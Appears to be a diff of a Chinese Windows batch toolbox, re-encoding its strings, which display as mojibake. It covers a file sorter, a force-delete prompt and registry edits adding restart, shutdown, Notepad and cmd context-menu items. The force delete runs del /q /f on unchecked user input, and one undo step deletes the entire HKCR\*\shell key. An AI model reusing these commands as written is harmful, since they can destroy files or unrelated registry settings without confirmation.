+echo           â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯
+echo                                              æŒ‰ä»»æ„é”®è¿›å…¥ä¸‹ä¸€æ­¥...
 pause>nul
 
 :mark24.1
 cls
-title ÎÄ¼ş¹éÀàÕûÀíÆ÷-²ÎÊıÉèÖÃ
+title æ–‡ä»¶å½’ç±»æ•´ç†å™¨-å‚æ•°è®¾ç½®
 echo.
 echo.
 echo.
 echo.
-echo         Çë°ÑÒª´¦ÀíµÄÎÄ¼ş¼ĞÀ­µ½±¾´°¿Ú(Ö±½Ó»Ø³µ½«´¦Àíµ±Ç°Ä¿Â¼)£º
+echo         è¯·æŠŠè¦å¤„ç†çš„æ–‡ä»¶å¤¹æ‹‰åˆ°æœ¬çª—å£(ç›´æ¥å›è½¦å°†å¤„ç†å½“å‰ç›®å½•)ï¼š
 echo.
 set "source_path=%cd%"
 set /p source_path=                 
 echo.
-echo          ÇëÊäÈë±£´æÎ»ÖÃ¾ø¶ÔÂ·¾¶(Ö±½Ó»Ø³µ½«±£´æÔÚÔ´ÎÄ¼ş¼ĞÏÂ)£º
+echo          è¯·è¾“å…¥ä¿å­˜ä½ç½®ç»å¯¹è·¯å¾„(ç›´æ¥å›è½¦å°†ä¿å­˜åœ¨æºæ–‡ä»¶å¤¹ä¸‹)ï¼š
 set destination_path=
 set /p destination_path=                 
 echo.
-echo             ÇëÊäÈëÒª´¦ÀíµÄÎÄ¼şÀàĞÍ£¬¶à¸öÀàĞÍÒÔ¿Õ¸ñ·Ö¸ô
+echo             è¯·è¾“å…¥è¦å¤„ç†çš„æ–‡ä»¶ç±»å‹ï¼Œå¤šä¸ªç±»å‹ä»¥ç©ºæ ¼åˆ†éš”
 echo.
-echo                (Èç£ºrar exe£»Ö±½Ó»Ø³µ½«´¦ÀíËùÓĞÀàĞÍ)£º
+echo                (å¦‚ï¼šrar exeï¼›ç›´æ¥å›è½¦å°†å¤„ç†æ‰€æœ‰ç±»å‹)ï¼š
 echo.
 set type_included=
 set /p type_included=                 
@@ -2312,7 +2312,7 @@ if exist "%source_path:"=%" (
 ) else goto mark24.1
 set "source_dir=%source_path:"=%"
 
-rem ======= ¼ÆËãÔ´ÎÄ¼ş¼ĞµÄ²ãÉî =======
+rem ======= è®¡ç®—æºæ–‡ä»¶å¤¹çš„å±‚æ·± =======
 set source_layers=0
 set "source_dir_tmp=%source_dir%"
 :mark24.2
@@ -2330,7 +2330,7 @@ for /f "delims=" %%i in ('dir /a-d /b /s /oe "%source_path%"') do (
 )
 goto :eof
 
-rem ======= °´ÎÄ¼şÀàĞÍ´´½¨ÎÄ¼ş¼Ğ =======
+rem ======= æŒ‰æ–‡ä»¶ç±»å‹åˆ›å»ºæ–‡ä»¶å¤¹ =======
 :mark24.3
 set include=
 for %%i in (%type_included%) do if /i "%1"==".%%i" set include=yes
@@ -2344,7 +2344,7 @@ if not defined destination set destination_path=%2
 set "destination_path=%destination_path:"=%"
 if not "%destination_path:~-1%"=="\" set "destination_path=%destination_path%\"
 
-rem ======= »ñÈ¡ÎÄ¼şÔÚÔ´ÎÄ¼şÖĞµÄÏà¶ÔÎ»ÖÃ =======
+rem ======= è·å–æ–‡ä»¶åœ¨æºæ–‡ä»¶ä¸­çš„ç›¸å¯¹ä½ç½® =======
 set source_sub_path=%2
 set "source_sub_path=%source_sub_path:"=%"
 set num=0
@@ -2354,49 +2354,49 @@ set /a num+=1
 if not %num% equ %source_layers% goto mark24.4
 
 
-rem ======= »ñÈ¡ÎÄ¼şËùÔÚÂ·¾¶µÄÄ¿Â¼Ãû =======
+rem ======= è·å–æ–‡ä»¶æ‰€åœ¨è·¯å¾„çš„ç›®å½•å =======
 for /f "delims=" %%i in ("%destination_path:~0,-1%") do set "source_name=%%~nxi"
 
-:: Í¨¹ı¶Ô±ÈÎÄ¼şÀàĞÍÃûºÍÎÄ¼şËùÔÚÂ·¾¶µÄÄ¿Â¼ÃûÀ´ÅĞ¶ÏÄÄĞ©ÎÄ¼şÒÑ¾­ÕûÀí¹ı
+:: é€šè¿‡å¯¹æ¯”æ–‡ä»¶ç±»å‹åå’Œæ–‡ä»¶æ‰€åœ¨è·¯å¾„çš„ç›®å½•åæ¥åˆ¤æ–­å“ªäº›æ–‡ä»¶å·²ç»æ•´ç†è¿‡
 
-if "%source_name%"=="%types%ÎÄ¼ş" goto :eof
+if "%source_name%"=="%types%æ–‡ä»¶" goto :eof
 
-:: ÅĞ¶ÏÎÄ¼şËùÔÚÎ»ÖÃÊÇ·ñ·¢ÉúÁË±ä»¯
+:: åˆ¤æ–­æ–‡ä»¶æ‰€åœ¨ä½ç½®æ˜¯å¦å‘ç”Ÿäº†å˜åŒ–
 if %2=="%source_path%" (set chang_dir=) else set chang_dir=yes&set file_type=
 
-:: ÅĞ¶ÏÒª´¦ÀíµÄÎÄ¼şÊÇ²»ÊÇÅú´¦ÀíÎÄ¼ş×ÔÉí
+:: åˆ¤æ–­è¦å¤„ç†çš„æ–‡ä»¶æ˜¯ä¸æ˜¯æ‰¹å¤„ç†æ–‡ä»¶è‡ªèº«
 if "%destination_path%%nx_name%"=="%~f0" (set file_self=yes) else set file_self=
 
-:: ÅĞ¶ÏÎÄ¼şÀàĞÍÊÇ·ñ·¢ÉúÁË±ä»¯
+:: åˆ¤æ–­æ–‡ä»¶ç±»å‹æ˜¯å¦å‘ç”Ÿäº†å˜åŒ–
 
 if /i "%1"=="%file_type%" (set same_type=yes) else set same_type=
 if not defined destination set source_sub_path=
 
 if not defined chang_dir (
-    if not defined file_self if not defined same_type md "%destination_path%%source_sub_path%%types%ÎÄ¼ş" 2>nul
+    if not defined file_self if not defined same_type md "%destination_path%%source_sub_path%%types%æ–‡ä»¶" 2>nul
 ) else (
-    if not defined file_self if not defined same_type md "%destination_path%%source_sub_path%%types%ÎÄ¼ş" 2>nul
+    if not defined file_self if not defined same_type md "%destination_path%%source_sub_path%%types%æ–‡ä»¶" 2>nul
 )
-if not defined file_self move /-y %2"%nx_name%" "%destination_path%%source_sub_path%%types%ÎÄ¼ş"
+if not defined file_self move /-y %2"%nx_name%" "%destination_path%%source_sub_path%%types%æ–‡ä»¶"
 goto :eof
 
-:: source_path£ºÔ´ÎÄ¼ş¼ĞÂ·¾¶
-:: source_layers£ºÔ´ÎÄ¼ş¼ĞµÄ²ãÉî
-:: destination_path£ºÄ¿µÄÎÄ¼ş¼ĞÂ·¾¶
-:: include£ºÒªÅÅ³ıµÄÎÄ¼şÀàĞÍ
-:: destination£º±êÖ¾±äÁ¿£¬ÓÃÀ´ÅĞ¶ÏÊÇ·ñÖ¸¶¨Ä¿µÄÎÄ¼ş¼ĞÂ·¾¶
-:: nx_name£ºÔ´ÎÄ¼şµÄÎÄ¼şÃûºÍºó×ºÃû×éºÏ
-:: file_type£ºÔ´ÎÄ¼şµÄÀàĞÍ
-:: source_sub_path£ºÔ´ÎÄ¼şÏà¶ÔÓÚÔ´ÎÄ¼ş¼ĞµÄÂ·¾¶
-:: source_path_tmp£ºÔ´ÎÄ¼ş¼ĞÂ·¾¶µÄÁÙÊ±±äÁ¿
-:: source_name£ºÔ´ÎÄ¼şÃû
-:: source_name_tmp£ºÔ´ÎÄ¼şÃûÁÙÊ±±äÁ¿
-:: chang_dir£ºÅĞ¶ÏÎÄ¼ş¼ĞÊÇ·ñ·¢Éú±ä»¯µÄ±êÖ¾
-:: same_type£ºÅĞ¶ÏÎÄ¼şÀàĞÍÊÇ·ñÏàÍ¬µÄ±äÁ¿
-:: file_self£ºÅĞ¶ÏÊÇ²»ÊÇÅú´¦ÀíÎÄ¼ş×ÔÉíµÄ±äÁ¿
-:: included£ºÒª´¦ÀíµÄÎÄ¼şÀàĞÍ
-:: type_included£º¾ö¶¨ÊÇ·ñ´¦Àíµ±Ç°ÎÄ¼şÀàĞÍµÄ±êÖ¾
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+:: source_pathï¼šæºæ–‡ä»¶å¤¹è·¯å¾„
+:: source_layersï¼šæºæ–‡ä»¶å¤¹çš„å±‚æ·±
+:: destination_pathï¼šç›®çš„æ–‡ä»¶å¤¹è·¯å¾„
+:: includeï¼šè¦æ’é™¤çš„æ–‡ä»¶ç±»å‹
+:: destinationï¼šæ ‡å¿—å˜é‡ï¼Œç”¨æ¥åˆ¤æ–­æ˜¯å¦æŒ‡å®šç›®çš„æ–‡ä»¶å¤¹è·¯å¾„
+:: nx_nameï¼šæºæ–‡ä»¶çš„æ–‡ä»¶åå’Œåç¼€åç»„åˆ
+:: file_typeï¼šæºæ–‡ä»¶çš„ç±»å‹
+:: source_sub_pathï¼šæºæ–‡ä»¶ç›¸å¯¹äºæºæ–‡ä»¶å¤¹çš„è·¯å¾„
+:: source_path_tmpï¼šæºæ–‡ä»¶å¤¹è·¯å¾„çš„ä¸´æ—¶å˜é‡
+:: source_nameï¼šæºæ–‡ä»¶å
+:: source_name_tmpï¼šæºæ–‡ä»¶åä¸´æ—¶å˜é‡
+:: chang_dirï¼šåˆ¤æ–­æ–‡ä»¶å¤¹æ˜¯å¦å‘ç”Ÿå˜åŒ–çš„æ ‡å¿—
+:: same_typeï¼šåˆ¤æ–­æ–‡ä»¶ç±»å‹æ˜¯å¦ç›¸åŒçš„å˜é‡
+:: file_selfï¼šåˆ¤æ–­æ˜¯ä¸æ˜¯æ‰¹å¤„ç†æ–‡ä»¶è‡ªèº«çš„å˜é‡
+:: includedï¼šè¦å¤„ç†çš„æ–‡ä»¶ç±»å‹
+:: type_includedï¼šå†³å®šæ˜¯å¦å¤„ç†å½“å‰æ–‡ä»¶ç±»å‹çš„æ ‡å¿—
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
@@ -2408,13 +2408,13 @@ exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
 :mark25
 @echo off
 cls
-title Ç¿É¾
+title å¼ºåˆ 
 color bc
 mode con cols=26 lines=8
-set/p l=(°ÑÎÄ¼şÍÏµ½±¾´°¿Ú»Ø³µÉ¾³ı)                                          
+set/p l=(æŠŠæ–‡ä»¶æ‹–åˆ°æœ¬çª—å£å›è½¦åˆ é™¤)                                          
 del %l% /q /f&cls
-@echo ÈÎÒâ¼üÍË³ö &pause>nul 2>nul
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+@echo ä»»æ„é”®é€€å‡º &pause>nul 2>nul
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
@@ -2424,40 +2424,40 @@ exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
 
 :mark26
 @echo off
-TITLE  Windows ÓÒ¼üÀ©Õ¹    
+TITLE  Windows å³é”®æ‰©å±•    
 :startfjcyz
 MODE con: COLS=80 LINES=31
 color 4f
 cls
-echo                       ¨q©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤¨r
-echo   ¨q©¤©¤©¤©¤©¤©¤©¤©¤©¤©È        ÓÒ  ¼ü  ²Ë  µ¥        ©À©¤©¤©¤©¤©¤©¤©¤©¤©¤¨r
-echo   ©¦                  ¨t©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤¨s                  ©¦
-echo   ©¦                                                                      ©¦
-echo   ©¦  1¡¢ÓÒ¼üÌí¼ÓÖØÆô                            10¡¢ÓÒ¼üÌí¼Ó×¢Ïú         ©¦
-echo   ©¦                                                                      ©¦
-echo   ©¦  2¡¢ÓÒ¼üÌí¼Ó¹Ø»ú                            11¡¢ÓÒ¼üÌí¼Ó»òÉ¾³ı³ÌĞò   ©¦
-echo   ©¦                                                                      ©¦
-echo   ©¦  3¡¢Ôö¼Ó¸ö¸´ÖÆµ½...ÒÆ¶¯µ½...¹¦ÄÜ            12¡¢ÓÒ¼üÌí¼Ó¿ØÖÆÃæ°å     ©¦
-echo   ©¦                                                                      ©¦
-echo   ©¦  4¡¢ÓÒ¼üÌí¼Ó¼ÇÊÂ±¾´ò¿ªÏî                    13¡¢ÓÒ¼üÌí¼Ó·şÎñ         ©¦
-echo   ©¦                                                                      ©¦
-echo   ©¦  5¡¢ÔÊĞí»ØÊÕÕ¾ÖØÃüÃû                        14¡¢ÓÒ¼üÌí¼Ó×é²ß         ©¦
-echo   ©¦                                                                      ©¦
-echo   ©¦  6¡¢ÓÒ¼üÌí¼Ó´ò¿ªMS-DOS                      15¡¢ÓÒ¼üÌí¼ÓÉè±¸¹ÜÀíÆ÷   ©¦
-echo   ©¦                                                                      ©¦
-echo   ©¦  7¡¢ÓÒ¼üÌí¼ÓÏÔÊ¾/Òş²ØÎÄ¼ş+À©Õ¹Ãû +                                   ©¦
-echo   ©¦                                                                      ©¦
-echo   ©¦  8¡¢ÓÒ¼üÌí¼ÓÇå¿Õ»ØÊÕÕ¾                                               ©¦
-echo   ©¦                                                                      ©¦
-echo   ©¦  9¡¢ÓÒ¼ü¹âÇı +                                                       ©¦
-echo   ©¦                                                                      ©¦
-echo   ©¦                                                                      ©¦
-echo   ©¦                              e¡¢ÍË³ö                                 ©¦
-echo   ©¦                                                                      ©¦
-echo   ©¦                                                                      ©¦
-echo   ©¦       ±¾Ò³³ı´ø + ÏîÍâ£¬¸÷Êı×Öºó¼Óa£¬¾ùÎªÈ¡Ïû²Ù×÷£¬Èç1a£¬2aµÈ¡£       ©¦
-echo   ¨t©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤¨s
-set /p list0=  ÇëÊäÈëÑ¡Ïî:
+echo                       â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®
+echo   â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        å³  é”®  èœ  å•        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â•®
+echo   â”‚                  â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯                  â”‚
+echo   â”‚                                                                      â”‚
+echo   â”‚  1ã€å³é”®æ·»åŠ é‡å¯                            10ã€å³é”®æ·»åŠ æ³¨é”€         â”‚
+echo   â”‚                                                                      â”‚
+echo   â”‚  2ã€å³é”®æ·»åŠ å…³æœº                            11ã€å³é”®æ·»åŠ æˆ–åˆ é™¤ç¨‹åº   â”‚
+echo   â”‚                                                                      â”‚
+echo   â”‚  3ã€å¢åŠ ä¸ªå¤åˆ¶åˆ°...ç§»åŠ¨åˆ°...åŠŸèƒ½            12ã€å³é”®æ·»åŠ æ§åˆ¶é¢æ¿     â”‚
+echo   â”‚                                                                      â”‚
+echo   â”‚  4ã€å³é”®æ·»åŠ è®°äº‹æœ¬æ‰“å¼€é¡¹                    13ã€å³é”®æ·»åŠ æœåŠ¡         â”‚
+echo   â”‚                                                                      â”‚
+echo   â”‚  5ã€å…è®¸å›æ”¶ç«™é‡å‘½å                        14ã€å³é”®æ·»åŠ ç»„ç­–         â”‚
+echo   â”‚                                                                      â”‚
+echo   â”‚  6ã€å³é”®æ·»åŠ æ‰“å¼€MS-DOS                      15ã€å³é”®æ·»åŠ è®¾å¤‡ç®¡ç†å™¨   â”‚
+echo   â”‚                                                                      â”‚
+echo   â”‚  7ã€å³é”®æ·»åŠ æ˜¾ç¤º/éšè—æ–‡ä»¶+æ‰©å±•å +                                   â”‚
+echo   â”‚                                                                      â”‚
+echo   â”‚  8ã€å³é”®æ·»åŠ æ¸…ç©ºå›æ”¶ç«™                                               â”‚
+echo   â”‚                                                                      â”‚
+echo   â”‚  9ã€å³é”®å…‰é©± +                                                       â”‚
+echo   â”‚                                                                      â”‚
+echo   â”‚                                                                      â”‚
+echo   â”‚                              eã€é€€å‡º                                 â”‚
+echo   â”‚                                                                      â”‚
+echo   â”‚                                                                      â”‚
+echo   â”‚       æœ¬é¡µé™¤å¸¦ + é¡¹å¤–ï¼Œå„æ•°å­—ååŠ aï¼Œå‡ä¸ºå–æ¶ˆæ“ä½œï¼Œå¦‚1aï¼Œ2aç­‰ã€‚       â”‚
+echo   â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯
+set /p list0=  è¯·è¾“å…¥é€‰é¡¹:
 if "%list0%"=="1" goto list1_1
 if "%list0%"=="1a" goto list1_1a
 if "%list0%"=="2" goto list2_2
@@ -2491,9 +2491,9 @@ if "%list0%"=="15a" goto list15_15a
 if "%list0%"=="0" goto startfjcyz
 if "%list0%"=="e" goto exit
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 0
 :list1_1
 MODE con: COLS=50 LINES=15
@@ -2502,7 +2502,7 @@ echo.
 ECHO Windows Registry Editor Version 5.00>SHOWALL.reg
 
 ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\restart]>>SHOWALL.reg
-ECHO @="ÖØÆô¼ÆËã»ú(&Q)">>SHOWALL.reg
+ECHO @="é‡å¯è®¡ç®—æœº(&Q)">>SHOWALL.reg
 
 ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\restart\command]>>SHOWALL.reg
 ECHO @="Shutdown.exe -r -t 0">>SHOWALL.reg
@@ -2512,12 +2512,12 @@ REGEDIT /S SHOWALL.reg
 DEL /F /Q SHOWALL.reg
 cls
 echo.
-echo                ÓÒ¼ü²Ëµ¥ÒÑÌí¼ÓÖØÆô!
+echo                å³é”®èœå•å·²æ·»åŠ é‡å¯!
 echo.
-echo                  °´ÈÎÒâ¼ü·µ»Ø!
+echo                  æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 0
 :list1_1a
 MODE con: COLS=50 LINES=15
@@ -2525,12 +2525,12 @@ cls
 reg delete "HKLM\SOFTWARE\Classes\Folder\shell\restart" /f
 cls
 echo.
-echo                 ÓÒ¼üÖØÆôÒÑÉ¾³ı!
+echo                 å³é”®é‡å¯å·²åˆ é™¤!
 echo.
-echo                  °´ÈÎÒâ¼ü·µ»Ø!
+echo                  æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 2
 :list2_2
 MODE con: COLS=50 LINES=15
@@ -2538,7 +2538,7 @@ cls
 ECHO Windows Registry Editor Version 5.00>SHOWALL.reg
 
 ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\close]>>SHOWALL.reg
-ECHO @="¹Ø±Õ¼ÆËã»ú(&G)">>SHOWALL.reg
+ECHO @="å…³é—­è®¡ç®—æœº(&G)">>SHOWALL.reg
 
 ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\close\command]>>SHOWALL.reg
 ECHO @="Shutdown.exe -s -t 0">>SHOWALL.reg
@@ -2548,12 +2548,12 @@ REGEDIT /S SHOWALL.reg
 DEL /F /Q SHOWALL.reg
 cls
 echo.
-echo                ÓÒ¼ü²Ëµ¥ÒÑÌí¼Ó¹Ø»ú!
+echo                å³é”®èœå•å·²æ·»åŠ å…³æœº!
 echo.
-echo                  °´ÈÎÒâ¼ü·µ»Ø!
+echo                  æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 2
 :list2_2a
 MODE con: COLS=50 LINES=15
@@ -2561,12 +2561,12 @@ cls
 reg delete "HKLM\SOFTWARE\Classes\Folder\shell\close" /f
 cls
 echo.
-echo                 ÓÒ¼ü¹Ø»úÒÑÉ¾³ı!
+echo                 å³é”®å…³æœºå·²åˆ é™¤!
 echo.
-echo                  °´ÈÎÒâ¼ü·µ»Ø!
+echo                  æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 3
 :list3_3
 MODE con: COLS=50 LINES=15
@@ -2589,12 +2589,12 @@ REGEDIT /S SHOWALL.reg
 DEL /F /Q SHOWALL.reg
 cls
 echo.
-echo                   Ìí¼Ó³É¹¦!
+echo                   æ·»åŠ æˆåŠŸ!
 echo.
-echo                 °´ÈÎÒâ¼ü·µ»Ø!
+echo                 æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 3
 :list3_3a
 MODE con: COLS=50 LINES=15
@@ -2603,12 +2603,12 @@ reg delete "HKLM\SOFTWARE\Classes\AllFilesystemObjects\shellex\ContextMenuHandle
 reg delete "HKLM\SOFTWARE\Classes\AllFilesystemObjects\shellex\ContextMenuHandlers\Move To" /f
 cls
 echo.
-echo                   É¾³ı³É¹¦!
+echo                   åˆ é™¤æˆåŠŸ!
 echo.
-echo                 °´ÈÎÒâ¼ü·µ»Ø!
+echo                 æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 4
 :list4_4
 MODE con: COLS=50 LINES=15
@@ -2616,9 +2616,9 @@ cls
 echo.
 ECHO Windows Registry Editor Version 5.00>>SHOWALL.reg
 
-ECHO [HKEY_CLASSES_ROOT\*\shell\ÓÃ"¼ÇÊÂ±¾"´ò¿ª]>>SHOWALL.reg
+ECHO [HKEY_CLASSES_ROOT\*\shell\ç”¨"è®°äº‹æœ¬"æ‰“å¼€]>>SHOWALL.reg
 
-ECHO [HKEY_CLASSES_ROOT\*\shell\ÓÃ"¼ÇÊÂ±¾"´ò¿ª\command]>>SHOWALL.reg
+ECHO [HKEY_CLASSES_ROOT\*\shell\ç”¨"è®°äº‹æœ¬"æ‰“å¼€\command]>>SHOWALL.reg
 ECHO @="notepad.exe %%1">>SHOWALL.reg
 
 REGEDIT /S SHOWALL.reg
@@ -2626,12 +2626,12 @@ REGEDIT /S SHOWALL.reg
 DEL /F /Q SHOWALL.reg
 cls
 echo.
-echo                 ³É¹¦¼ÓÈë¼ÇÊÂ±¾!
+echo                 æˆåŠŸåŠ å…¥è®°äº‹æœ¬!
 echo.
-echo                  °´ÈÎÒâ¼ü·µ»Ø!
+echo                  æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 4
 :list4_4a
 MODE con: COLS=50 LINES=15
@@ -2639,12 +2639,12 @@ cls
 reg delete "HKCR\*\shell" /f
 cls
 echo.
-echo                ¼ÇÊÂ±¾´ò¿ªÒÑÉ¾³ı!
+echo                è®°äº‹æœ¬æ‰“å¼€å·²åˆ é™¤!
 echo.
-echo                  °´ÈÎÒâ¼ü·µ»Ø!
+echo                  æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 5
 :list5_5
 MODE con: COLS=50 LINES=15
@@ -2661,12 +2661,12 @@ REGEDIT /S SHOWALL.reg
 DEL /F /Q SHOWALL.reg
 cls
 echo.
-echo                 ÒÑÔÊĞíÖØÃüÃû!
+echo                 å·²å…è®¸é‡å‘½å!
 echo.
-echo                 °´ÈÎÒâ¼ü·µ»Ø!
+echo                 æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 5
 :list5_5a
 MODE con: COLS=50 LINES=15
@@ -2683,65 +2683,65 @@ REGEDIT /S SHOWALL.reg
 DEL /F /Q SHOWALL.reg
 cls
 echo.
-echo                  ÒÑÈ¡ÏûÖØÃüÃû!
+echo                  å·²å–æ¶ˆé‡å‘½å!
 echo.
-echo                  °´ÈÎÒâ¼ü·µ»Ø!
+echo                  æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 6
 :list6_6
 MODE con: COLS=50 LINES=15
 cls
 echo.
-reg add "HKCR\*\shell\´ò¿ªms-dos" /ve /d ´ò¿ªms-dos /f
-reg add "HKCR\*\shell\´ò¿ªms-dos\command"  /ve /d "cmd.exe /k cd %%1"  /f
-reg add "HKCR\Folder\shell\´ò¿ªms-dos" /ve /d ´ò¿ªms-dos /f
-reg add "HKCR\Folder\shell\´ò¿ªms-dos\command" /ve /d "cmd.exe /k cd %%1" /f
